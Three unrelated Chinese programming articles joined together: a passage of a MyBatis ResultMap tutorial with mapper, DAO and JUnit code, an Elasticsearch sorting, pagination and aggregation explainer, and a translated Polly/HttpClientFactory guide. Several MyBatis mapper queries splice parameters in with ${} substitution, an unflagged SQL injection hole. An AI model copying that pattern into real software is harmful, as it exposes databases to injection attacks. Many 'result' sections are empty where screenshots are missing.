MyBatis中使用ResultMap完成自定义输出结果映射，如一对多，多对多关联关系。
问题：
假定POJO对象与表中的字段不一致，如下所示:

接口：

    /**
     * 根据性别获得学生集合
     */
    List<Stu> selectStudentsBySex(String sex);

映射：

    <select id="selectStudentsBySex" parameterType="String" resultType="stu">
        SELECT id,name,sex from student where sex=#{sex};
    </select>

测试：

    /**
     * Method: selectStudentsBySex(String sex)
     */
    @Test
    public void testSelectStudentsBySex() throws Exception {
        List<Stu> students=dao.selectStudentsBySex("boy");
        System.out.println(students);
        Assert.assertNotNull(students.get(0));
    }

结果：
 
（一）、定义并引用ResultMap
修改映射文件：

    <!--定义结果映射，id是引用时的编号需唯一，stu是最终被映射的类型-->
    <resultMap id="stuMap" type="stu">
        <!--映射结果,collumn表示列名，property表示属性名-->
        <result column="id" property="stu_id"></result>
        <result column="name" property="stu_name"></result>
        <result column="sex" property="stu_sex"></result>
    </resultMap>
    
    <!--resultMap指定引用的映射-->
    <select id="selectStudentsBySex" parameterType="String" resultMap="stuMap">
        SELECT id,name,sex from student where sex=#{sex};
    </select>

测试结果：

（二）、使用别名
 修改映射文件：

    <select id="selectStudentsBySex" parameterType="String" resultType="stu">
      SELECT id stu_id,name stu_name,sex as stu_sex from student where sex=#{sex};
    </select>

测试结果：

4.2.3、返回Map
假定要返回id作为key，name作为value的Map。
接口：

    /**
     * 获得所有学生Map集合
     */
    List<Map<String,Object>> selectAllStudents();

映射：

    <resultMap id="stuKeyValueMap" type="HashMap">
        <result property="name" column="NAME"></result>
        <result property="value" column="VALUE"></result>
    </resultMap>

    <select id="selectAllStudents" resultMap="stuKeyValueMap">
        SELECT id NAME,name VALUE from student;
    </select>

测试：

   /**
     * Method: selectAllStudents()
     */
    @Test
    public void testSelectAllStudents() throws Exception {
        List<Map<String,Object>>  students=dao.selectAllStudents();
        System.out.println(students);
        Assert.assertNotNull(students);
    }

结果：

<resultMap id="pieMap"   type="HashMap">  
    <result property="value" column="VALUE" />  
    <result property="name" column="NAME" />  
</resultMap>

<select id="queryPieParam" parameterType="String" resultMap="pieMap">
    SELECT
    　　PLAT_NAME NAME,
        <if test='_parameter == "总量"'>
            AMOUNT VALUE
        </if>
        <if test='_parameter == "总额"'>
            TOTALS VALUE
        </if>
    FROM
        DOMAIN_PLAT_DEAL_PIE
    ORDER BY
        <if test='_parameter  == "总量"'>
            AMOUNT
        </if>
        <if test='_parameter  == "总额"'>
            TOTALS
        </if>
    ASC
</select>

用resultType进行输出映射，只有查询出来的列名和pojo中的属性名一致，该列才可以映射成功。
如果查询出来的列名和pojo的属性名不一致，通过定义一个resultMap对列名和pojo属性名之间作一个映射关系。
 最终完成的映射器：


<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE mapper
        PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"
        "http://mybatis.org/dtd/mybatis-3-mapper.dtd">
<mapper namespace="com.zhangguo.mybatis03.dao.StudentMapper">

    <select id="selectStudentById" resultType="Student">
        SELECT id,name,sex from student where id=#{id}
    </select>

    <select id="selectStudentsCount" resultType="long">
        SELECT count(*) from student
    </select>

    <select id="selectStudentsByName" parameterType="String" resultType="student">
        SELECT id,name,sex from student where name like '%${value}%';
    </select>

    <resultMap id="stuKeyValueMap" type="HashMap">
        <result property="name" column="NAME"></result>
        <result property="value" column="VALUE"></result>
    </resultMap>

    <select id="selectAllStudents" resultMap="stuKeyValueMap">
        SELECT id NAME,name VALUE from student;
    </select>


    <!--定义结果映射，id是引用时的编号需唯一，stu是最终被映射的类型-->
    <resultMap id="stuMap" type="stu">
        <!--映射结果,collumn表示列名，property表示属性名-->
        <result column="id" property="stu_id"></result>
        <result column="name" property="stu_name"></result>
        <result column="sex" property="stu_sex"></result>
    </resultMap>

    <!--resultMap指定引用的映射-->
    <!--<select id="selectStudentsBySex" parameterType="String" resultMap="stuMap">-->
        <!--SELECT id,name,sex from student where sex=#{sex};-->
    <!--</select>-->

    <select id="selectStudentsBySex" parameterType="String" resultType="stu">
      SELECT id stu_id,name stu_name,sex as stu_sex from student where sex=#{sex};
    </select>


    <select id="selectStudentsByNameOrSex" resultType="student">
      SELECT id,name,sex from student where name like '%${realname}%' or sex=#{sex};
    </select>

    <select id="selectStudentsByIdOrSex" resultType="student">
        SELECT id,name,sex from student where id=#{no} or sex=#{sex};
    </select>


    <insert id="insertStudent" parameterType="student">
        insert into student(name,sex) VALUES(#{name},'${sex}')
    </insert>

    <update id="updateStudent" parameterType="student">
        update student set name=#{name},sex=#{sex} where id=#{id}
    </update>

    <delete id="deleteStudent" parameterType="int">
        delete from student where id=#{id}
    </delete>

    <delete id="deleteStudents">
        delete from student where id in
        <foreach collection="list" item="id" open="(" separator="," close=")">
            #{id}
        </foreach>
    </delete>

</mapper>

View Code
 最终完成的数据访问类似：


package com.zhangguo.mybatis03.dao;

import com.zhangguo.mybatis03.entities.Stu;
import com.zhangguo.mybatis03.entities.Student;
import com.zhangguo.mybatis03.utils.SqlSessionFactoryUtil;
import org.apache.ibatis.session.SqlSession;

import java.util.List;
import java.util.Map;

public class StudentDao implements StudentMapper {

    /**
     * 根据学生编号获得学生对象
     */
    public Student selectStudentById(int id) {
        Student entity = null;
        //打开一个会话
        SqlSession session = SqlSessionFactoryUtil.openSession(true);

        //获得一个映射器
        StudentMapper mapper = session.getMapper(StudentMapper.class);

        //查询单个对象，指定参数为3
        entity = mapper.selectStudentById(id);

        //关闭
        SqlSessionFactoryUtil.closeSession(session);

        return entity;
    }

    /**
     * 获得学生总数
     */
    public long selectStudentsCount() {
        long count = 0;
        //打开一个会话
        SqlSession session = SqlSessionFactoryUtil.openSession(true);

        //获得一个映射器
        StudentMapper mapper = session.getMapper(StudentMapper.class);

        //查询单行单列，简单值
        count = mapper.selectStudentsCount();

        //关闭
        SqlSessionFactoryUtil.closeSession(session);

        return count;
    }


    /**
     * 根据学生姓名获得学生集合
     */
    public List<Student> selectStudentsByName(String name) {
        List<Student> entities = null;
        //打开一个会话
        SqlSession session = SqlSessionFactoryUtil.openSession(true);

        //获得一个映射器
        StudentMapper mapper = session.getMapper(StudentMapper.class);

        //查询多个对象，指定参数
        entities = mapper.selectStudentsByName(name);
        //关闭
        SqlSessionFactoryUtil.closeSession(session);
        return entities;
    }

    /**
     * 获得所有学生Map集合
     *
     */
    public List<Map<String, Object>> selectAllStudents() {
        List<Map<String, Object>> entities = null;
        //打开一个会话
        SqlSession session = SqlSessionFactoryUtil.openSession(true);

        //获得一个映射器
        StudentMapper mapper = session.getMapper(StudentMapper.class);

        //查询多个对象，指定参数
        entities = mapper.selectAllStudents();
        //关闭
        SqlSessionFactoryUtil.closeSession(session);
        return entities;
    }

    /**
     * 根据性别获得学生集合
     *
     * @param sex
     */
    public List<Stu> selectStudentsBySex(String sex) {
        List<Stu> entities = null;
        //打开一个会话
        SqlSession session = SqlSessionFactoryUtil.openSession(true);

        //获得一个映射器
        StudentMapper mapper = session.getMapper(StudentMapper.class);

        //查询多个对象，指定参数
        entities = mapper.selectStudentsBySex(sex);
        //关闭
        SqlSessionFactoryUtil.closeSession(session);
        return entities;
    }

    /**
     * 根据学生姓名或性别获得学生集合
     *
     * @param name
     * @param sex
     */
    public List<Student> selectStudentsByNameOrSex(String name, String sex) {
        List<Student> entities = null;
        //打开一个会话
        SqlSession session = SqlSessionFactoryUtil.openSession(true);

        //获得一个映射器
        StudentMapper mapper = session.getMapper(StudentMapper.class);

        //查询多个对象，指定参数
        entities = mapper.selectStudentsByNameOrSex(name, sex);
        //关闭
        SqlSessionFactoryUtil.closeSession(session);
        return entities;
    }

    /**
     * 根据学生Id或性别获得学生集合
     *
     * @param param
     */
    public List<Student> selectStudentsByIdOrSex(Map<String, Object> param) {
        List<Student> entities = null;
        //打开一个会话
        SqlSession session = SqlSessionFactoryUtil.openSession(true);

        //获得一个映射器
        StudentMapper mapper = session.getMapper(StudentMapper.class);

        //查询多个对象，指定参数
        entities = mapper.selectStudentsByIdOrSex(param);
        //关闭
        SqlSessionFactoryUtil.closeSession(session);
        return entities;
    }


    /**
     * 添加学生
     */
    public int insertStudent(Student entity) {
        //影响行数
        int rows = 0;
        //打开一个会话
        SqlSession session = SqlSessionFactoryUtil.openSession(true);

        //获得一个映射器
        StudentMapper mapper = session.getMapper(StudentMapper.class);

        //执行添加
        rows = mapper.insertStudent(entity);
        //关闭
        SqlSessionFactoryUtil.closeSession(session);
        return rows;
    }

    /**
     * 更新学生
     */
    public int updateStudent(Student entity) {
        //影响行数
        int rows = 0;
        //打开一个会话
        SqlSession session = SqlSessionFactoryUtil.openSession(true);

        //获得一个映射器
        StudentMapper mapper = session.getMapper(StudentMapper.class);

        //执行更新
        rows = mapper.updateStudent(entity);
        //关闭
        SqlSessionFactoryUtil.closeSession(session);
        return rows;
    }

    /**
     * 删除学生
     */
    public int deleteStudent(int id) {
        //影响行数
        int rows = 0;
        //打开一个会话
        SqlSession session = SqlSessionFactoryUtil.openSession(true);

        //获得一个映射器
        StudentMapper mapper = session.getMapper(StudentMapper.class);

        //执行删除
        rows = mapper.deleteStudent(id);
        //关闭
        SqlSessionFactoryUtil.closeSession(session);
        return rows;
    }

    /**
     * 删除多个学生通过编号
     *
     * @param ids
     */
    public int deleteStudents(List<Integer> ids) {
        //影响行数
        int rows = 0;
        //打开一个会话
        SqlSession session = SqlSessionFactoryUtil.openSession(true);

        //获得一个映射器
        StudentMapper mapper = session.getMapper(StudentMapper.class);

        //执行删除
        rows = mapper.deleteStudents(ids);
        //关闭
        SqlSessionFactoryUtil.closeSession(session);
        return rows;
    }

}

View Code
 最终完成的接口：


package com.zhangguo.mybatis03.dao;

import com.zhangguo.mybatis03.entities.Stu;
import com.zhangguo.mybatis03.entities.Student;
import org.apache.ibatis.annotations.Param;

import java.util.List;
import java.util.Map;

public interface StudentMapper {
    /**
     * 根据学生编号获得学生对象
     */
    Student selectStudentById(int id);

    /**
     * 获得学生总数
     * */
    long selectStudentsCount();

    /**
     * 根据学生姓名获得学生集合
     */
    List<Student> selectStudentsByName(String name);


    /**
     * 获得所有学生Map集合
     */
    List<Map<String,Object>> selectAllStudents();

    /**
     * 根据性别获得学生集合
     */
    List<Stu> selectStudentsBySex(String sex);

    /**
     * 根据学生姓名或性别获得学生集合
     */
    List<Student> selectStudentsByNameOrSex(@Param("realname") String name,@Param("sex") String sex);

    /**
     * 根据学生Id或性别获得学生集合
     */
    List<Student> selectStudentsByIdOrSex(Map<String,Object> param);


    /**
     * 添加学生
     */
    int insertStudent(Student entity);

    /**
     * 更新学生
     */
    int updateStudent(Student entity);

    /**
     * 删除学生
     */
    int deleteStudent(int id);

    /**
     * 删除多个学生通过编号
     */
    int deleteStudents(List<Integer> ids);
}

View Code
 最终完成的测试：


package com.zhangguo.mybatis03.dao;

import com.zhangguo.mybatis03.entities.Stu;
import com.zhangguo.mybatis03.entities.Student;
import org.junit.*;
import org.junit.runners.MethodSorters;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * StudentDao Tester.
 *
 * @author <Authors name>
 * @version 1.0
 * @since <pre>09/26/2018</pre>
 */
@FixMethodOrder(MethodSorters.JVM)//指定测试方法按定义的顺序执行
public class StudentDaoTest {
    StudentMapper dao;
    @Before
    public void before() throws Exception {
        dao=new StudentDao();
    }

    @After
    public void after() throws Exception {
    }

    /**
     * Method: selectStudentById(int id)
     */
    @Test
    public void testSelectStudentById() throws Exception {
        Student entity=dao.selectStudentById(1);
        System.out.println(entity);
        Assert.assertNotNull(entity);
    }

    //
    /**
     * Method: selectStudentsCount()
     */
    @Test
    public void testSelectStudentsCount() throws Exception {
        Assert.assertNotEquals(0,dao.selectStudentsCount());
    }
    /**
     * Method: selectStudentsByName(String name)
     */
    @Test
    public void testSelectStudentsByName() throws Exception {
        List<Student> students=dao.selectStudentsByName("C");
        System.out.println(students);
        Assert.assertNotNull(students);
    }

    /**
     * Method: selectAllStudents()
     */
    @Test
    public void testSelectAllStudents() throws Exception {
        List<Map<String,Object>>  students=dao.selectAllStudents();
        System.out.println(students);
        Assert.assertNotNull(students);
    }

    /**
     * Method: selectStudentsBySex(String sex)
     */
    @Test
    public void testSelectStudentsBySex() throws Exception {
        List<Stu> students=dao.selectStudentsBySex("boy");
        System.out.println(students);
        Assert.assertNotNull(students.get(0));
    }


    /**
     * Method: selectStudentsByIdOrSex
     */
    @Test
    public void testSelectStudentsByNameOrSex() throws Exception {
        Map<String ,Object> param=new HashMap<String,Object>();
        param.put("no",1);
        param.put("sex","girl");
        List<Student> students=dao.selectStudentsByIdOrSex(param);
        System.out.println(students);
        Assert.assertNotNull(students);
    }

    /**
     * Method: insertStudent
     */
    @Test
    public void testInsertStudent() throws Exception {
        Student entity=new Student();
        //entity.setName("张明");
        entity.setSex("boy");

        Assert.assertEquals(1,dao.insertStudent(entity));
    }

    /**
     * Method: updateStudent
     */
    @Test
    public void testUpdateStudent() throws Exception {
        Student entity=dao.selectStudentById(11);
        //entity.setName("张丽美");
        entity.setSex("girl");

        Assert.assertEquals(1,dao.updateStudent(entity));
    }

    /**
     * Method: deleteStudent
     */
    @Test
    public void testDeleteStudent() throws Exception {
        Assert.assertEquals(1,dao.deleteStudent(12));
    }



    /**
     * Method: deleteStudents
     */
    @Test
    public void testDeleteStudents() throws Exception {
        List<Integer> ids=new ArrayList<Integer>();
        ids.add(10);
        ids.add(11);
        Assert.assertEquals(2,dao.deleteStudents(ids));
    }
} 

View Code
五、示例源代码
https://git.coding.net/zhangguo5/MyBatis03.git
https://git.coding.net/zhangguo5/MyBatis02.git
六、视频
https://www.bilibili.com/video/av32447485/
七、作业
1、重现上所有上课示例
2、请使用Maven多模块+Git+MyBatis完成一个单表的管理功能，需要UI,可以AJAX也可以JSTL作表示层。
3、分页，多条件组合查询，多表连接（选作）
4、内部测试题（4个小时）
4.1、请实现一个简易图书管理系统（LibSystem），实现图书管理功能，要求如下：(初级)
1、管理数据库中所有图书（Books），包含图书编号（isbn）、书名（title）、作者（author）、价格（price）、出版日期（publishDate）
2、Maven多模块+MySQL+Git+MyBatis+JUnit单元测试
3、表示层可以是AJAX或JSTL
C10 R(10+10) U10 D10
 
4.2、请实现一个迷你图书管理系统（LibSystem），实现图书管理功能，要求如下：(中级)
1、管理数据库中所有图书分类（Categories），包含图书编号（id）,名称（name）
2、管理数据库中所有图书（Books），包含图书编号（isbn）、类别（categoryId，外键）书名（title）、作者（author）、价格（price）、出版日期（publishDate）、封面（cover）、详细介绍（details）
3、分页 10
4、多条件组件查询（3个以上的条件任意组合）(高级) 10
5、多删除 (高级) 10
6、上传封面 (高级) 10
7、富文本编辑器 (高级) 10

********************************************************************************************************************************************************************************************************
Elastic Stack-Elasticsearch使用介绍(四)
一、前言
    上一篇说了一下查询和存储机制，接下来我们主要来说一下排序、聚合、分页；
    写完文章以后发现之前文章没有介绍Coordinating Node，这个地方补充说明下Coordinating Node(协调节点):搜索请求或索引请求可能涉及保存在不同数据节点上的数据。例如，搜索请求在两个阶段中执行，当客户端请求到节点上这个阶段的时候，协调节点将请求转发到保存数据的数据节点。每个数据节点在分片执行请求并将其结果返回给协调节点。当节点返回到客端这个阶段的时候，协调节点将每个数据节点的结果减少为单个节点的所有数据的结果集。这意味着每个节点具有全部三个node.master，node.data并node.ingest这个属性,当node.ingest设置为false仅作为协调节点，不能被禁用。
二、排序
   ES默认使用相关性算分来排序，如果想改变排序规则可以使用sort:
   
  也可以指定多个排序条件:
   
   排序的过程是指是对字段原始内容排序的过程，在排序的过程中使用的正排索引，是通过文档的id和字段进行排序的；Elasticsearch针对这种情况提供两种实现方式:fielddata和doc_value;
   fielddata
   fielddata的数据结构，其实根据倒排索引反向出来的一个正排索引，即document到term的映射。只要我们针对需要分词的字段设置了fielddata，就可以使用该字段进行聚合，排序等。我们设置为true之后，在索引期间，就会以列式存储在内存中。为什么存在于内存呢，因为按照term聚合，需要执行更加复杂的算法和操作，如果基于磁盘或者 OS 缓存，性能会比较差。用法如下:
   
   fielddata加载到内存中有几种情况，默认是懒加载。即对一个分词的字段执行聚合或者排序的时候，加载到内存。所以他不是在索引创建期间创建的，而是查询在期间创建的。
   fielddata在内存中加载的这样就会出现一个问题，数据量很大的情况容易发生OOM，这种时候我们该如何控制OOM的情况发生?
   1.内存限制
   indices.fielddata.cache.size: 20% 默认是无限制，限制内存使用以后频繁的导致内存回收，容易照成GC和IO损耗。
   2.断路器(circuit breaker)
   如果查询一次的fielddata超过总内存，就会发生内存溢出，circuit breaker会估算query要加载的fielddata大小，如果超出总内存，就短路，query直接失败;
   indices.breaker.fielddata.limit：fielddata的内存限制，默认60%
   indices.breaker.request.limit：执行聚合的内存限制，默认40%
   indices.breaker.total.limit：综合上面两个，限制在70%以内
   3.频率(frequency)
   加载fielddata的时候，也是按照segment去进行加载的，所以可以通过限制segment文档出现的频率去限制加载的数目；
   min :0.01 只是加载至少1%的doc文档中出现过的term对应的文档;
   min_segment_size: 500 少于500 文档数的segment不加载fielddata;
   fielddata加载方式:
   1.lazy
   这个在查询的放入到内存中，上面已经介绍过；
   2.eager(预加载)
   当一个新的segment形成的时候，就加载到内存中，查询的时候遇到这个segment直接查询出去就可以；
   3.eager_global_ordinals(全局序号加载)
   构建一个全局的Hash,新出现的文档加入Hash，文档中用序号代替字符，这样会减少内存的消耗，但是每次要是有segment新增或者删除时候回导致全局序号重建的问题；
   doc_value
   fielddata对内存要求比较高，如果数据量很大的话对内存是一个很大的考验。所以Elasticsearch又给我们提供了另外的策略doc_value,doc_value使用磁盘存储，与fielddata结构完全是一样的，在倒排索引基础上反向出来的正排索引，并且是预先构建，即在建倒排索引的时候，就会创建doc values。,这会消耗额外的存储空间，但是对于JVM的内存需求就会减少。总体来看，dov_valus只是比fielddata慢一点，大概10-25%，则带来了更多的稳定性。
   类型是string的字段，生成分词字段(text)和不分词字段(keyword)，不分词字段即使用keyword，所以我们在聚合的时候，可以直接使用field.keyword进行聚合，而这种默认就是使用doc_values，建立正排索引。不分词的字段，默认建立doc_values,即字段类型为keyword，他不会创建分词，就会默认建立doc_value，如果我们不想该字段参与聚合排序，我们可以设置doc_values=false，避免不必要的磁盘空间浪费。但是这个只能在索引映射的时候做，即索引映射建好之后不能修改。
   两者对比:
   
三、分页
   有3种类型的分页,如下图:
   
   1.from/size
   form开始的位置，size获取的数量；
   
   数据在分片存储的情况下怎么查询前1000个文档?
   在每个分片上都先获取1000个文档，然后再由Coordinating Node聚合所有分片的结果后再排序选取前1000个文档,页数越多，处理文档就越多，占用内存越多，耗时越长。数据分别存放在不同的分片上，必须一个去查询；为了避免深度分页，Elasticsearch通过index.max_result_window限定显示条数，默认是10000；
   
   2.scroll
   scroll按照快照的方式来查询数据,可以避免深度分页的问题，因为是快照所以不能用来做实时搜索，数据不是实时的，接下来说一下scroll流程:
   首先发起scroll查询请求，Elasticsearch在接收到请求以后会根据查询条件查询文档i，1m表示该快照保留1分钟；
   
   接下来查询的时候根据上一次返回的快照id继续查询，不断的迭代调用直到返回hits.hits数组为空时停止
   
  过多的scroll调用会占用大量的内存，可以通过删除的clear api进行删除：
  删除某个:
  
 删除多个：
 
 删除所有:
 
 3.search after
 避免深度分页的性能问题，提供实时的下一页文档获取功能，通过提供实时游标来解决此问题，接下来我们来解释下这个问题:
 第一次查询:这个地方必须保证排序的值是唯一的
 
 第二步: 使用上一步最后一个文档的sort值进行查询
 
  通过保证排序字段唯一，我们实现类似数据库游标功能的效果； 
四、聚合分析
  Aggregation，是Elasticsearch除搜索功能外提供的针对Elasticsearch数据做统计分析的功能,聚合的实时性很高，都是及时返回，另外还提供多种分析方式，接下来我们看下聚合的4种分析方式:
  Metric
  在一组文档中计算平均值、最大值、最小值、求和等等； 
  Avg(平均值)
  
 
Min最小值


Sum求和(过滤查询中的结果查询出帽子的价格的总和)


Percentile计算从聚合文档中提取的数值的一个或多个百分位数;
解释下下面这个例子，网站响应时间做的一个分析，单位是毫秒，5毫秒响应占总响应时间的1%；


 Cardinality计算不同值的近似计数,类似数据库的distinct count


当然除了上面还包括很多类型，更加详细的内容可以参考官方文档;
Bucket
按照一定的规则将文档分配到不同的桶里，达到分类分析的目的；
比如把年龄小于10放入第一个桶，大于10小于30放入第二个桶里，大于30放到第三个桶里；

接下来我们介绍我们几个常用的类型:
Date Range
根据时间范围来划分桶的规则；


to表示小于当前时间减去10个月；from大于当前时间减去10个月；format设定返回格式；form和to还可以指定范围，大于某时间小于某时间；
Range
通过自定义范围来划分桶的规则；


这样就可以轻易做到上面按照年龄分组统计的规则；
Terms
直接按照term分桶，类似数据库group by以后求和，如果是text类型则按照分词结果分桶；


比较常用的类型大概就是这3种，比如还有什么Histogram等等，大家可以参考官方文档；
Pipeline
对聚合的结果在次进行聚合分析，根据输出的结果不同可以分成2类:
Parent
将返回的结果内嵌到现有的聚合结果中，主要有3种类型:
1.Derivative
计算Bucket值的导数;
2.Moving Average
计算Bucket值的移动平均值，一定时间段，对时间序列数据进行移动计算平均值;
3.Cumulatove Sum
计算累计加和;
Sibling
返回的结果与现有聚合结果同级；
1.Max/Min/Avg/Sum
2.Stats/Extended
Stats用于计算聚合中指定列的所有桶中的各种统计信息；
Extended对Stats的扩展，提供了更多统计数据（平方和，标准偏差等）；
3.Percentiles 
Percentiles 计算兄弟中指定列的所有桶中的百分位数；
更多介绍，请参考官方文档；
Matrix
矩阵分析,使用不多，参考官方文档;
原理探讨与数据准确性探讨:
Min原理分析:
先从每个分片计算最小值 -> 再从这些值中计算出最小值

Terms聚合以及提升计算值的准确性：
Terms聚合的执行流程：每个分片返回top10的数据，Coordinating node拿到数据之后进行整合和排序然后返回给用户。注意Terms并不是永远准确的，因为数据分散在多个分片上，所以Coordinating node无法得到所有数据(这句话有同学会有疑惑请查看上一篇文章)。如果要解决可以把分片数设置为1，消除数据分散的问题，但是会分片数据过多问题，或者设在Shard_Size大小，即每次从Shard上额外多获取的数据，以提升准确度。
Terms聚合返回结果中有两个值：
doc_count_error_upper_bound 被遗漏的Term的最大值；
sum_other_doc_count 返回聚合的其他term的文档总数；
在Terms中设置show_term_doc_count_error可以查看每个聚合误算的最大值；
Shard_Size默认大小：shard_size = (size*1.5)+10；
通过调整Shard_Size的大小可以提升准确度，增大了计算量降低响应的时间。
由上面可以得出在Elasticsearch聚合分析中，Cardinality和Percentile分析使用是近似统计算法，就是结果近似准确但是不一定精确，可以通过参数的调整使其结果精确，意味着会有更多的时间和更大的性能消耗。
五、结束语
Search分析到此基本结束，下一篇介绍一些常用的优化手段和建立索引时的考虑问题；欢迎大家加群438836709，欢迎大家关注我公众号！


********************************************************************************************************************************************************************************************************
在 .NET Core 中结合 HttpClientFactory 使用 Polly（中篇）


译者：王亮作者：Polly 团队原文：http://t.cn/EhZ90oq声明：我翻译技术文章不是逐句翻译的，而是根据我自己的理解来表述的（包括标题）。其中可能会去除一些不影响理解但本人实在不知道如何组织的句子






译者序：这是“Polly and HttpClientFactory”这篇Wiki文档翻译的中篇，你可以 点击这里查看上篇。接下来的两篇则是在这个基础上进行加强。本篇（中篇）主要讲如何在ASP.NET Core中通过HttpClientFactory配置Polly策略。如果你对ASP.NET Core 2.1新引入的HttpClient工厂还比较陌生，建议先阅读我的另一篇文章 .NET Core中正确使用 HttpClient的姿势，这有助于更好地理解本文。
—— 正文 ——
下面主要讲如何在ASP.NET Core中通过HttpClientFactory配置Polly策略。
使用 AddTransientHttpErrorPolicy
让我们先回到上篇的例子：
services.AddHttpClient("GitHub", client =>{    client.BaseAddress = new Uri("https://api.github.com/");    client.DefaultRequestHeaders.Add("Accept", "application/vnd.github.v3+json");}).AddTransientHttpErrorPolicy(builder => builder.WaitAndRetryAsync(new[]{    TimeSpan.FromSeconds(1),    TimeSpan.FromSeconds(5),    TimeSpan.FromSeconds(10)}));

这里用了一个新的AddTransientHttpErrorPolicy方法，它可以很方便地配置一个策略来处理下面这些典型的HTTP调用错误：

网络错误（HttpRequestException 异常）
HTTP状态码 5XX（服务器错误）
HTTP状态码 408（请求超时）

AddTransientHttpErrorPolicy方法添加了一个策略，这个策略默认预配置了上面HTTP错误的过滤器。在builder => builder子句中，你可以定义策略如何处理这些错误，还可以配置Polly提供的其它策略，比如重试（如上例所示）、断路或回退等。
在AddTransientHttpErrorPolicy中处理网络错误、HTTP 5XX和HTTP 408是一种便捷的方式，但这不是必需的。如果此方法内置的错误过滤器不适合您的需要（你需要仔细考虑一下），您可以扩展它，或者构建一个完全定制的Polly策略。
扩展 AddTransientHttpErrorPolicy
AddTransientHttpErrorPolicy方法也可以从Polly的一个扩展包Polly.Extensions.Http中得到，它在上面的基础上进行了扩展。例如下面配置的策略可以处理429状态码：
using Polly.Extensions.Http;// ...var policy = HttpPolicyExtensions  .HandleTransientHttpError() // HttpRequestException, 5XX and 408  .OrResult(response => (int)response.StatusCode == 429) // RetryAfter  .WaitAndRetryAsync(/* etc */);

使用典型Polly语法配置好的策略
Polly 还有另一个扩展方法是AddPolicyHandler，它的一个重载方法可以接收任意IAsyncPolicy参数，所以你可以用典型的Polly语法先定义好任意的一个策略（返回类型为IAsyncPolicy），然后再传给AddPolicyHandler扩展方法。
下面这个例子演示了用AddPolicyHandler来添加一个策略，其中我们编写了自己的错误处理策略：
var retryPolicy = Policy.Handle<HttpRequestException>()    .OrResult<HttpResponseMessage>(response => MyCustomResponsePredicate(response))    .WaitAndRetryAsync(new[]    {        TimeSpan.FromSeconds(1),        TimeSpan.FromSeconds(5),        TimeSpan.FromSeconds(10)    }));services.AddHttpClient("GitHub", client =>{    client.BaseAddress = new Uri("https://api.github.com/");    client.DefaultRequestHeaders.Add("Accept", "application/vnd.github.v3+json");}).AddPolicyHandler(retryPolicy);

类似的，你还可以配置其它策略，比如超时策略：
var timeoutPolicy = Policy.TimeoutAsync<HttpResponseMessage>(10);services.AddHttpClient(/* etc */)    .AddPolicyHandler(timeoutPolicy);

所有通过HttpClient的调用返回的都是一个HttpResponseMessage对象，因此配置的策略必须是IAsyncPolicy对象（译注：HTTP请求返回的是HttpResponseMessage对象，Polly定义的策略是一个IAsyncPolicy对象，所以AddPolicyHandler方法接收的参数是这两者的结合体IAsyncPolicy对象）。非泛型的IAsyncPolicy可以通过下面的方式转换成泛型的IAsyncPolicy：
var timeoutPolicy = Policy.TimeoutAsync(10);services.AddHttpClient(/* etc */)    .AddPolicyHandler(timeoutPolicy.AsAsyncPolicy<HttpResponseMessage>());

应用多个策略
所有策略配置的方法也可以链式地配置多个策略，例如：
services.AddHttpClient(/* etc */)    .AddTransientHttpErrorPolicy(builder => builder.WaitAndRetryAsync(new[]    {        TimeSpan.FromSeconds(1),        TimeSpan.FromSeconds(5),        TimeSpan.FromSeconds(10)    }))    .AddTransientHttpErrorPolicy(builder => builder.CircuitBreakerAsync(        handledEventsAllowedBeforeBreaking: 3,        durationOfBreak: TimeSpan.FromSeconds(30)    ));

多个策略被应用的顺序
当您配置多个策略时（如上例所示），策略应用于从外部（第一次配置）到内部（最后配置）的顺序依次调用。在上面的示例中，调用的顺序是这样的：

首先通过（外部）重试策略，该策略将依次：
通过（内部）断路策略的调用，该策略将依次：
进行底层HTTP调用。


这个示例之所以用此顺序的策略是因为当重试策略在两次尝试之间等待时，断路器可能在其中一个时间段（1、5或10秒）内改变状态（译注：上面示例中断路策略是出现3次异常就“休息”30分钟）。断路策略被配置在重试策略的内部，因此每执行一次重试就会执行其内部的断路策略。
上面的例子应用了两个策略（重试和断路），任意数量的策略都是可以的。一个常见的多个策略组合可能是这样的：重试、断路和超时（“下篇”会有例子）。
对于那些熟悉Polly的策略包的人来说，使用上面的方式配置多个策略完全等同于使用策略包，也适用于所有“策略包的使用建议”（链接：http://t.cn/EhJ4jfN）。
动态选择策略
AddPolicyHandler的重载方法允许你根据HTTP请求动态选择策略。
其中一个用例是对非等幂的操作应用不同的策略行为（译注：“等幂“指的是一个操作重复使用，始终都会得到同一个结果）。对于HTTP请求来说，POST操作通常不是幂等的（译注：比如注册），PUT操作应该是幂等的。所以对于给定的API可能不是一概而论的。比如，您可能想要定义一个策略，让它只重试GET请求，但不重试其他HTTP谓词，比如这个示例：
var retryPolicy = HttpPolicyExtensions    .HandleTransientHttpError()    .WaitAndRetryAsync(new[]    {        TimeSpan.FromSeconds(1),        TimeSpan.FromSeconds(5),        TimeSpan.FromSeconds(10)    });var noOpPolicy = Policy.NoOpAsync().AsAsyncPolicy<HttpResponseMessage>();services.AddHttpClient(/* etc */)    // 如果是GET请求，则使用重试策略，否则使用空策略    .AddPolicyHandler(request => request.Method == HttpMethod.Get ? retryPolicy : noOpPolicy);

上面的空策略会被应用于所有非GET的请求。空策略只是一种占坑模式，实际上不做任何事情。
从策略的注册池中选择策略
Polly还提供了策略注册池（请参阅：http://t.cn/Ehi1SQp ），它相当于策略的存储中心，被注册的策略可以让你在应用程序的多个位置重用。AddPolicyHandler的一个重载方法允许您从注册池中选择策略。
下面的示例使用IServiceCollection添加一个策略注册池服务，向注册池中添加一些策略，然后使用注册池中的不同策略定义两个调用逻辑。
var registry = services.AddPolicyRegistry();registry.Add("defaultretrystrategy",     HttpPolicyExtensions.HandleTransientHttpError().WaitAndRetryAsync(/* etc */));registry.Add("defaultcircuitbreaker",     HttpPolicyExtensions.HandleTransientHttpError().CircuitBreakerAsync(/* etc */));services.AddHttpClient(/* etc */)    .AddPolicyHandlerFromRegistry("defaultretrystrategy");services.AddHttpClient(/* etc */)    .AddPolicyHandlerFromRegistry("defaultretrystrategy")    .AddPolicyHandlerFromRegistry("defaultcircuitbreaker");

